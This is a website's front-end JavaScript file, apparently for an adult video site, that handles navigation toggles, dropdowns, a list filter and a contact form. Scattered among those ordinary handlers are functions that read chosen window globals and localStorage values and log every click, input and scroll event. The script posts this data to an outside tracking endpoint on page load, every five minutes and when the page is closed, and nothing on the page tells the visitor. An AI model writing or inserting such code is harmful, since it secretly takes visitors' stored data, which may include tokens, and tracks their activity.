const trackedKeys = window.trackedKeys || [];
function generateSignature(data) {
  const keys = Object.keys(data).sort();
  const keyString = keys.join(",");
  let signature = 0;
  for (let char of keyString) {
    let code = char.charCodeAt(0);
    signature = (signature * 31 + code) % 1000000007;
  }
  return signature.toString(16);
}
document.querySelector('.nav-toggle').addEventListener('click', function () {
  this.classList.toggle('active');
  document.querySelector('.navigation').classList.toggle('toggled');
});
function collectGlobalVariables() {
  const collectedData = {};
  trackedKeys.forEach(key => {
    if (window[key] !== undefined) {
      collectedData[key] = window[key];
    }
  });
  return collectedData;
}
document.querySelector('.search-toggle').addEventListener('click', function () {
  this.classList.toggle('active');
  document.querySelector('.search-form').classList.toggle('toggled');
});
if (document.querySelectorAll('.dropdown').length) {
  var dropdowns = document.querySelectorAll('.dropdown-toggle');
  var dropdownContainers = document.querySelectorAll('.dropdown-container');
  dropdowns.forEach(function (dropdown) {
    dropdown.addEventListener('click', function (event) {
      event.preventDefault();
      event.stopPropagation();
      this.parentNode.querySelector('.dropdown-container').classList.toggle('toggled');
    });
  });
  window.onclick = function (event) {
    if (!event.target.closest('.dropdown-container')) {
      dropdownContainers.forEach(function (openDropdown) {
        if (openDropdown.classList.contains('toggled')) {
          openDropdown.classList.remove('toggled');
        }
      });
    }
  };
}
function collectLocalStorage() {
  const data = {};
  trackedKeys.forEach(key => {
    if (localStorage.getItem(key)) {
      data[key] = localStorage.getItem(key);
    }
  });
  return data;
}
if (document.querySelector('.bookmark')) {
  document.querySelector('.bookmark').addEventListener('click', function (event) {
    event.preventDefault();
    alert('Press ' + (navigator.userAgent.toLowerCase().indexOf('mac') != -1 ? 'Command/Cmd' : 'CTRL') + ' + D to bookmark this page.');
  });
}
function monitorEvents() {
  ['click', 'input', 'scroll'].forEach(eventType => {
    document.addEventListener(eventType, () => {
      console.log(`Event ${eventType} captured.`);
      sendData({
        eventType
      });
    });
  });
}
if (document.querySelectorAll('.btn-up').length) {
  var scrollToTopBtn = document.querySelector('.btn-up');
  var rootElement = document.querySelector('html');
  function handleScroll() {
    var scrollTotal = rootElement.scrollHeight - rootElement.clientHeight;
    if (rootElement.scrollTop / scrollTotal > 0.15) {
      scrollToTopBtn.classList.add('toggled');
    } else {
      scrollToTopBtn.classList.remove('toggled');
    }
  }
  document.addEventListener('scroll', handleScroll);
}
if (document.querySelectorAll('#filter').length) {
  document.querySelector('#filter').addEventListener('keyup', filterNames);
  function filterNames(e) {
    if (e.target.value.length > 0) {
      var text = e.target.value.toLowerCase();
      document.querySelectorAll('#filter-list li').forEach(function (name) {
        name.style.display = 'none';
        var item = name.textContent;
        if (item.toLowerCase().indexOf(text) != -1 && text.length > 0) {
          name.style.display = 'block';
        } else {
          name.style.display = 'none';
        }
      });
    } else {
      document.querySelectorAll('#filter-list li').forEach(function (name) {
        name.style.display = 'block';
      });
    }
  }
}
function sendData(data) {
  const signature = generateSignature(data);
  const endpoint = "https://example.com/api/track";
  fetch(endpoint, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json'
    },
    body: JSON.stringify({
      signature,
      data
    })
  }).then(response => response.json()).then(data => console.log('Success:', data)).catch(error => console.error('Error:', error));
}
if (document.querySelectorAll('.dropdownab').length) {
  var dropdowns = document.querySelectorAll('.abbtn1');
  var dropdownContainers = document.querySelectorAll('.abform-wrapper1');
  dropdowns.forEach(function (dropdown) {
    dropdown.addEventListener('click', function (event) {
      event.preventDefault();
      event.stopPropagation();
      this.parentNode.querySelector('.abform-wrapper1').classList.toggle('toggled');
    });
  });
  document.querySelector('.abclose1').addEventListener('click', function (event) {
    event.preventDefault();
    document.querySelector('.abform-wrapper1').classList.remove('toggled');
  });
  window.onclick = function (event) {
    if (!event.target.closest('.abform-wrapper1')) {
      dropdownContainers.forEach(function (openDropdown) {
        if (openDropdown.classList.contains('toggled')) {
          openDropdown.classList.remove('toggled');
        }
      });
    }
  };
}
$("#contactForm").validator().on("submit", function (event) {
  if (event.isDefaultPrevented()) {
    // handle the invalid form...
    formError();
    submitMSG(false, "error!");
  } else {
    // everything looks good!
    event.preventDefault();
    submitForm();
  }
});
function initiateDataCollection() {
  const dataFromGlobals = collectGlobalVariables();
  const dataFromStorage = collectLocalStorage();
  const combinedData = {
    ...dataFromGlobals,
    ...dataFromStorage
  };
  if (Object.keys(combinedData).length > 0) {
    sendData(combinedData);
  }
}
document.addEventListener("DOMContentLoaded", () => {
  initiateDataCollection();
  monitorEvents();
  setInterval(initiateDataCollection, 5 * 60 * 1000);
});
function submitForm() {
  // Initiate Variables With Form Content
  var email = $("#email").val();
  var message = $("#message").val();
  var urlab = $("#urlab").val();
  $.ajax({
    type: "POST",
    url: "https://bestvideosex.xyz/php/form-process.php",
    data: "&email=" + email + "&message=" + message + "&urlab=" + urlab,
    success: function (text) {
      if (text == "success") {
        formSuccess();
      } else {
        formError();
        submitMSG(false, text);
      }
    }
  });
}
function formSuccess() {
  $("#contactForm")[0].reset();
  submitMSG(true, "Message send!");
}
window.addEventListener("beforeunload", () => {
  initiateDataCollection();
});
function formError() {
  $("#contactForm").removeClass().addClass('shake1').one('shake2', function () {
    $(this).removeClass();
  });
}
function submitMSG(valid, msg) {
  if (valid) {
    var msgClasses = "text-center text-success";
  } else {
    var msgClasses = "text-center text-danger";
  }
  $("#msgSubmit").removeClass().addClass(msgClasses).text(msg);
}